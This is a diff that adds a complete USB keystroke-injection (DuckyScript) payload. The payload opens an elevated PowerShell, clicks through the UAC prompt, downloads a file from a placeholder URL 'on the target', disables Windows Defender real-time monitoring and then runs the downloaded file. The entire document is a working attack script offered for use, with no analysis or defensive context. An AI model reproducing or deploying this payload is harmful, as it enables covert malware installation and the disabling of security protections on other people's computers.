@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING $down = New-Object System.Net.WebClient; $url = 'THE_URL_YOU_WANT_TO_DOWNLOAD_ON_THE_TARGET'; $file = 'FILE_NAME'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; Set-MpPreference -DisableRealtimeMonitoring $true; $exec.shellexecute($file); exit;
+ENTER
